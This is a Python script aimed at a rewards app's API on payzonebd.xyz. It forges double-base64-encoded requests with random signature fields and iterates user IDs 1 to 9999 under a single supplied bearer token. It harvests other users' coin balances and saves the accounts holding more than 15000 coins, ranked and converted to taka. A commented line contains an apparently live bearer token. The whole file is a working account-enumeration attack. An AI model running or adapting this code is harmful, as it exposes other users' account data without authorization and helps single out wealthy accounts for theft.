import requests,base64,random,secrets,json,operator
from requests.structures import CaseInsensitiveDict




class Base64Jx:
	def __init__(self,text,amount):
		self.text=text
		self.amount=amount
		
		
	def b64en(self,type):
		for I in range(self.amount):
			self.text=base64.b64encode(self.text.encode(type)).decode(type)
		return self.text
	def b64de(self,type):
		for j in range(self.amount):
			self.text=base64.b64decode(self.text.encode(type)).decode(type)
		return self.text




def save_data(data):
	import json
	with open("save_data.json","w")as F:
		json.dump(data,F,sort_keys=True,indent=2)

def load_data(data):
	import json
	with open("save_data.json","r") as R:
		all_data=json.load(R)
		




def cheak_balance(uid,token):
	data='{"sal":"'+secrets.token_hex(15)+'","sig":"'+str(random.randrange(100,999))+'","mid":"'+str(uid)+'","tid":"'+str(random.randrange(1000,9999))+'","data":"","pack":"com.app.cozyrewardsnewtop"}'
	data=Base64Jx(data,2).b64en("ascii")
	url = "https://netravpn.payzonebd.xyz/api/v1/user_coin?data="+data
	#ZXlKellXd2lPaUkzT0RobFlqSXhNelZrTlRjME5XRXdOR1JqTTJRMU16QXhZek13TVRrek1pSXNJ%0Abk5wWnlJNklqRTJPU0lzSW0xcApaQ0k2SWpFek9UQXhJaXdpZEdsa0lqb2lOVGc1TkNJc0ltUmhk%0AR0VpT2lJaUxDSndZV05ySWpvaVkyOXRMbUZ3Y0M1amIzcDVjbVYzCllYSmtjMjVsZDNSdmNDSjkK%0A"

	headers = CaseInsensitiveDict()
	headers["Host"] = "dme.payzonebd.xyz"
	headers["accept"] = "application/json"
	headers["authorization"] =token #"Bearer 290600|DZjc6TJ3tTFkLhLCyNpB7yxU41t5yg4eqDrDZhZY"
	headers["user-agent"] = "AAAAAAAAcgwcEQkB"
	headers["accept-encoding"] = "gzip"
	
	
	resp = requests.get(url, headers=headers,verify=True)
	#print(resp.text)
	try:
		json_data=json.loads(resp.text)
		
		baleance=json_data["data"]
		
		
		if baleance !="0" and int(baleance) > 15000:
			print(baleance,"   ",uid)
			local_data={
			"Balance":int(baleance),
			"U_id":uid,
			
			}
			all_data.append(local_data)
			print(uid,"\t",int(baleance)/150," Tk")
		
	except:
				print(uid,end="\r")
				None
				
				#print(resp.text)
				
				
	
	#json_raw_data =json.loads(resp.text)
token=input("Enter token : ")	
all_data=[]
for i in range(1,10000):
	cheak_balance(str(i),token)
	all_data = sorted(all_data, key=operator.itemgetter('Balance'),reverse=True)
	save_data(all_data)
	
	